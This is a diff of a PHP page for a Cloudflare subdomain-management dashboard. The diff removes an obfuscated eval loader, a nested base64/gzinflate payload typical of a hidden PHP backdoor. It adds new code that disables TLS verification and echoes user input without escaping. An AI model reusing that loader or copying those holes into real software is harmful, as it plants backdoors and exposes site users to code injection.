@@ -1,8 +1,327 @@
- 
 <?php
+session_start();
+if (!isset($_SESSION["login"]) || $_SESSION["login"] !== true) {
+    header("Location: ../login.php");
+    exit;
+}
+// Tampilkan halaman dashboard jika session login ditemukan
 
-$Cyber = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNENyaW1lJTI5JTI5JTI5JTI5JTI5JTI5JTI5JTI5JTNC";
-$Crime = "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";
-eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
-exit;
+$config_file = file_get_contents('config/data.json');
+$config = json_decode($config_file, true);
+
+$api_token = $config['api_token']; // Mendapatkan API token yang telah di-hash
+$zone_ids = $config['zone_ids']; // Daftar zone_ids
+$entries = isset($_GET['entries']) ? intval($_GET['entries']) : 25; // Jumlah entri per halaman
+$page = isset($_GET['page']) ? intval($_GET['page']) : 1; // Halaman saat ini
+$start = ($page - 1) * $entries; // Index data awal untuk halaman ini
+
+// Inisialisasi daftar subdomain
+$subdomains = [];
+
+// Loop melalui setiap zone_id
+foreach ($zone_ids as $zone_id) {
+    $url = 'https://api.cloudflare.com/client/v4/zones/' . $zone_id . '/dns_records?type=A&proxied=true';
+
+    $curl = curl_init($url);
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+    $headers = array(
+        "Authorization: Bearer " . $api_token,
+        "Content-Type: application/json",
+    );
+    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+    // For debugging purposes only!
+    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+    $resp = curl_exec($curl);
+    curl_close($curl);
+
+    $p = json_decode($resp, true);
+
+    // Tambahkan subdomain dari hasil API ke daftar subdomain
+    foreach ($p['result'] as $item) {
+        $subdomains[] = $item;
+    }
+}
+
+$total = count($subdomains); // Total data di database
+$total_pages = ceil($total / $entries); // Total halaman yang diperlukan
+
+// Batasi index data akhir agar tidak melebihi jumlah data di database
+$end = $start + $entries;
+if ($end > $total) {
+    $end = $total;
+}
+
+// Jika tombol delete ditekan
+if (isset($_POST['delete'])) {
+    $ids = $_POST['delete_list'];
+    
+    foreach ($ids as $id) {
+        // Loop melalui setiap zone_id untuk menghapus subdomain
+        foreach ($zone_ids as $zone_id) {
+            $url = 'https://api.cloudflare.com/client/v4/zones/' . $zone_id . '/dns_records/' . $id;
+
+            $curl = curl_init($url);
+            curl_setopt($curl, CURLOPT_URL, $url);
+            curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "DELETE");
+            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+            $headers = array(
+                "Authorization: Bearer " . $api_token,
+                "Content-Type: application/json",
+            );
+            curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+            // For debugging purposes only!
+            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+            $resp = curl_exec($curl);
+            curl_close($curl);
+        }
+    }
+
+    // Redirect kembali ke halaman ini setelah penghapusan
+    header("Location: " . $_SERVER['PHP_SELF'] . "?page=" . $page);
+    exit();
+}
+
 ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="canonical" href="https://x-tools.my.id">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Ramabhadra&family=Tilt+Neon&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.16/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js"></script>
+    <title>Dashboard - ホストコード</title>
+    <meta name="base_url" content="index.php">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="canonical" href="index.php">
+    <link rel="icon" href="asset/favicon-32x32.png" type="image/png">
+    <meta name='description' itemprop='description' content='X-TOOLS VIP adalah sebuah website untuk membuat sebuah subdomain yang dapat digunakan untuk melakukan pointing ip server hosting anda ke subdomain kami.'>
+    <meta property="og:title" content="X-TOOLS VIP">
+    <meta property="og:description" content="X-TOOLS VIP adalah sebuah website untuk membuat sebuah subdomain yang dapat digunakan untuk melakukan pointing ip server hosting anda ke subdomain kami.">
+    <meta property="og:url" content="index.php">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="asset/thumbnail.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="627">
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="index.php">
+    <meta property="twitter:title" content="X-TOOLS VIP">
+    <meta property="twitter:description" content="X-TOOLS VIP adalah sebuah website untuk membuat sebuah subdomain yang dapat digunakan untuk melakukan pointing ip server hosting anda ke subdomain kami.">
+    <meta property="twitter:image" content="asset/thumbnail.jpg">
+    <link rel="icon" href="asset/favicon-32x32.png" type="image/png">
+</head>
+<body class="font-sans-serif p-2 bg-gray-900 text-sm" style="font-family: 'Ramabhadra', sans-serif;
+font-family: 'Tilt Neon', sans-serif; padding-top: 2rem;">
+<nav class="fixed z-50 top-0 left-0 right-0 flex flex-wrap border items-center justify-between bg-gray-800 p-2 mt-1 mx-auto rounded-lg" style="border-radius:20px;margin:5px;">
+    <div class="flex items-center flex-shrink-0 text-white mr-6">
+        <svg class="h-8 w-8 fill-current" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm0 18c-4.411 0-8-3.589-8-8s3.589-8 8-8 8 3.589 8 8-3.589 8-8 8z" />
+            <path d="M12 14c-2.757 0-5-2.243-5-5s2.243-5 5-5 5 2.243 5 5-2.243 5-5 5zm0-8c-1.654 0-3 1.346-3 3s1.346 3 3 3 3-1.346 3-3-1.346-3-3-3z" />
+        </svg>
+        <a href="../" class="font-semibold font-bold text-2xl tracking-tight ml-4 bg-gradient-to-r from-blue-400 via-white to-green-500 text-transparent bg-clip-text hover:text-white hover:bg-clip-text">
+            ホストコード
+        </a>
+    </div>
+    <div class="block lg:hidden">
+        <button id="menu-toggle" class="flex items-center px-4 py-2 border rounded-lg text-gray-200 border-gray-400 hover:text-white hover:border-white">
+    <i class="fas fa-bars"></i> 
+</button>
+    </div>
+    <div id="nav-menu" class="hidden w-full lg:block lg:flex-grow lg:w-auto">
+    	<div class="text-center lg:flex-grow border-b border-gray-700 pb-2 text-xs"></div>
+            <div class="lg:flex-grow border-b border-gray-700 pb-2" style="font-size: 12px;">
+                <a href="../" class="hover:bg-transparent block w-full border-gray-100 border py-2 px-6 rounded-lg mt-4 lg:inline-block lg:mt-0 text-gray-200 hover:text-white hover:text-teal-500 mr-4 font-bold">
+                    ⟩⟩ CREATE SUBDOMAIN HOSTING
+                </a>
+                <a href="../panel.php" class="hover:bg-transparent block w-full border-gray-100 border py-2 px-6 rounded-lg mt-1 mb-2 lg:inline-block lg:mt-0 text-gray-200 hover:text-white hover:text-teal-500 mr-4 font-bold">
+                    ⟩⟩ CREATE SUBDO PANEL PTERODACTYL
+                </a>
+                <a href="update.php" class="hover:bg-transparent block w-full border-gray-100 border py-2 px-6 rounded-lg mt-1 mb-2 lg:inline-block lg:mt-0 text-gray-200 hover:text-white hover:text-teal-500 mr-4 font-bold">
+                    ⟩⟩ UPDATE DATA
+                </a>
+            </div>
+            <div class="flex justify-center text-center items-center mt-2 mb-4">
+                <a href="logout.php" class="inline-block px-8 py-2 leading-none rounded-full text-white bg-red-500 hover:border-transparent hover:text-gray-100 hover:bg-red-700 font-bold">LOGOUT</a>
+            </div>
+        </div>
+</nav>
+    <div class="container mx-auto mt-4 p-5">
+        <div class="flex justify-between">
+            <h1 class="text-3xl text-white font-bold">DNS Records</h1>            
+            <div class="relative">
+                <form action="#" method="get" id="search-form">
+    <div class="relative flex items-center">
+        <input type="text" name="search" placeholder="Cari subdomain..." class="w-full rounded-full border-2 border-gray-700 focus:ring-2 focus:ring-gray-700 focus:border-transparent px-4 py-2" value="<?= isset($_GET['search']) ? $_GET['search'] : '' ?>" oninput="search()">
+        <button type="button" id="search-button" class="search-btn absolute right-0 top-0 bottom-0 bg-gray-700 border border-gray-700 text-white px-4 py-2 rounded-full" onclick="submitSearch()">
+            <i class="fa-solid fa-search"></i>
+        </button>
+    </div>
+</form>
+   
+
+<script>
+    const searchInput = document.querySelector('input[name="search"]');
+    const searchButton = document.querySelector('.search-btn');
+    const searchForm = document.getElementById('search-form');
+    const searchResults = document.getElementById('search-results');
+    
+    function search() {
+        const searchTerm = searchInput.value;
+
+        if (searchTerm !== '') {
+            searchButton.classList.remove('hidden');
+        } else {
+            searchButton.classList.remove('hidden');
+        }
+    }
+
+    function submitSearch() {
+        searchForm.submit();
+    }
+
+    // Event listener untuk input pencarian
+    searchInput.addEventListener('input', search);
+
+    // Event listener untuk tombol "Search"
+    searchButton.addEventListener('click', submitSearch);
+</script>
+
+            </div>
+        </div>
+        <form action="#" method="post" class="mt-5">
+            <div class="flex text-center justify-center items-center mb-4 p-2 bg-gray-800 rounded-full border border-gray-100">
+                <div class="text-center items-center">
+                    <span class="text-white ">Show |</span>
+                    <select id="datatable-length" class="bg-gray-600 font-bold text-center text-white justify-center items-center rounded-lg border border-gray-100" style="width:100px; height:30px; appearance: none; -webkit-appearance: none; -moz-appearance: none; background-image: none;">
+                        <option value="25" <?= isset($_GET['entries']) && $_GET['entries'] == 25 ? 'selected' : '' ?>>25</option>
+                        <option value="40" <?= isset($_GET['entries']) && $_GET['entries'] == 40 ? 'selected' : '' ?>>40</option>
+                        <option value="65" <?= isset($_GET['entries']) && $_GET['entries'] == 65 ? 'selected' : '' ?>>65</option>
+                        <option value="100" <?= isset($_GET['entries']) && $_GET['entries'] == 100 ? 'selected' : '' ?>>100</option>
+                        <option value="150" <?= isset($_GET['entries']) && $_GET['entries'] == 150 ? 'selected' : '' ?>>150</option>
+                        <option value="200" <?= isset($_GET['entries']) && $_GET['entries'] == 200 ? 'selected' : '' ?>>200</option>
+                    </select>
+                    <span class="text-white">| Entries</span>
+                </div>
+            </div>
+            <script>
+                var selectBox = document.getElementById("datatable-length");
+                selectBox.addEventListener("change", function() {
+                    // Get the selected value from the select box
+                    var selectedValue = selectBox.options[selectBox.selectedIndex].value;
+
+                    // Perform any necessary actions based on the selected value
+                    console.log("Selected value:", selectedValue);
+                    // For example, you could submit a form or make an AJAX request to fetch new data
+
+                    // Reload the page with the new entries value
+                    window.location.search = '?entries=' + selectedValue;
+                });
+            </script>
+        </form>
+        <form method="POST" action="" onsubmit="return confirm('Apakah Anda yakin ingin menghapus subdomain yang dipilih ?')">
+            <div class="flex justify-center text-center mt-4 mb-4">
+                <button type="submit" name="delete" class="bg-red-500 hover:bg-transparent text-white border-gray-100 font-bold px-10 py-2 rounded-full">HAPUS</button>
+            </div>
+            <div class="overflow-x-auto border-2 border-gray-100 mt-2 rounded-lg">
+                <table class="table-auto border-collapse bg-gray-100 border border-gray-100 w-full">
+                    <thead>
+                        <tr class="bg-gray-800 text-gray-100 justify-center text-center">
+                            <th class="px-3 py-2 text-left whitespace-nowrap border border-gray-100 rounded-lg">
+                                <label class="inline-flex items-center">
+                                    <input type="checkbox" class="form-checkbox" name="select_all" id="select_all">
+                                </label>
+                            </th>
+                            <th class="px-3 py-2 text-center border border-gray-100 rounded-lg">SUBDOMAIN</th>
+                            <th class="px-3 py-2 text-left border border-gray-100 rounded-lg">IP ADDRESS</th>
+                            <th class="px-3 py-2 text-left border border-gray-100 rounded-lg">TYPE</th>
+                            <th class="px-3 py-2 text-left border border-gray-100 rounded-lg">PROXY</th>
+                        </tr>
+                    </thead>
+                    
+                    <tbody>
+                        <?php
+$search_term = isset($_GET['search']) ? $_GET['search'] : '';
+
+for ($i = $start; $i < $end; $i++) {
+    $item = $subdomains[$i];
+    if ($search_term == '' || stripos($item['name'], $search_term) !== false) {
+        ?>
+                        <tr class="bg-gray-700 text-gray-100 justify-center text-center">
+                            <td class="px-3 py-2 text-left whitespace-nowrap border border-gray-600 rounded-lg">
+                                <label class="inline-flex items-center">
+                                    <input type="checkbox" class="form-checkbox" name="delete_list[]" value="<?= $item['id'] ?>">
+                                </label>
+                            </td>
+                            <td class="px-4 py-2 text-left border border-gray-600 rounded-lg overflow-hidden">
+    <a href="https://<?= $item['name'] ?>" class="text-blue-400 truncate" style="text-decoration: none;" target="_blank"><?= $item['name'] ?></a>
+</td>
+<td class="px-4 py-2 text-left border border-gray-600 rounded-lg overflow-hidden">
+    <span class="truncate"><?= $item['content'] ?></span>
+</td>
+<td class="px-4 py-2 text-left text-center border border-gray-600 rounded-lg overflow-hidden">
+    <span class="truncate"><?= $item['type'] ?></span>
+</td>
+<td class="px-4 py-2 text-left text-center border border-gray-600 rounded-lg overflow-hidden">
+    <span class="truncate"><?= $item['proxied'] ? 'Yes' : 'No' ?></span>
+</td>
+                        </tr>
+                        <?php
+    }
+}
+?>
+                    </tbody>
+                </table>
+            </div>
+        </form>
+    </div>
+            <div class="flex justify-center items-center">
+    <div class="flex items-center">
+        <span class="mx-1 text-white">Showing <?= $start ?> to <?= $end ?> of <?= $total ?> Entries</span>
+    </div>
+</div>
+<div class="flex items-center justify-center my-4">
+    <div id="pagination" class="flex items-center justify-center">
+        <?php if ($page > 1) : ?>
+            <a href="<?= $_SERVER['PHP_SELF'] ?>?page=1&entries=<?= $entries ?>" class="block bg-white border border-gray-500 gradient-text font-bold rounded-lg w-10 h-10 flex items-center justify-center <?= $page == 1 ? 'text-blue-500' : '' ?>">1</a>
+            <?php if ($page > 2) : ?>
+                <span class="block bg-gray-200 gradient-text border rounded-md w-10 h-10 font-bold text-center">...</span>
+            <?php endif; ?>
+        <?php endif; ?>
+        <?php
+        $startPage = max(1, $page - 2);
+        $endPage = min($total_pages, $page + 2);
+        for ($i = $startPage; $i <= $endPage; $i++) :
+        ?>
+            <a href="<?= $_SERVER['PHP_SELF'] ?>?page=<?= $i ?>&entries=<?= $entries ?>" class="block bg-white border border-gray-500 gradient-text font-bold rounded-lg w-10 h-10 flex items-center justify-center <?= $page == $i ? 'text-blue-500' : '' ?>"><?= $i ?></a>
+        <?php endfor; ?>
+        <?php if ($page < $total_pages) : ?>
+            <?php if ($page < $total_pages - 1) : ?>
+                <span class="block bg-gray-200 gradient-text border rounded-md w-10 h-10 font-bold text-center">...</span>
+            <?php endif; ?>
+            <a href="<?= $_SERVER['PHP_SELF'] ?>?page=<?= $total_pages ?>&entries=<?= $entries ?>" class="block bg-white border border-gray-500 gradient-text font-bold rounded-lg w-10 h-10 flex items-center justify-center <?= $page == $total_pages ? 'text-blue-500' : '' ?>"><?= $total_pages ?></a>
+        <?php endif; ?>
+    </div>
+</div>
+
+    <script src="https://cdn.jsdelivr.net/gh/HWIJakob/package@main/select.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/HWIJakob/package@main/function.js"></script>
+    
+        </div>
+         <div style="height: 10vh; display: flex; flex-direction: column; justify-content: flex-end;">
+                <h1 href="hosting.php" class="font-semibold font-bold text-1xl tracking-tight ml-2 mt-0.50 bg-gradient-to-r from-blue-400 via-white to-green-500 text-transparent bg-clip-text hover:text-white hover:bg-clip-text">© Copyright 2022.</h1><a href="https://wa.me/6285877276864" class="font-semibold font-bold text-1xl tracking-tight ml-2 mt-0.50 bg-gradient-to-r from-yellow-400 via-red to-green-500 text-transparent bg-clip-text hover:text-white hover:bg-clip-text">By Pedia Hosting👑.</a>
+        </div>
+</body>
+</html>
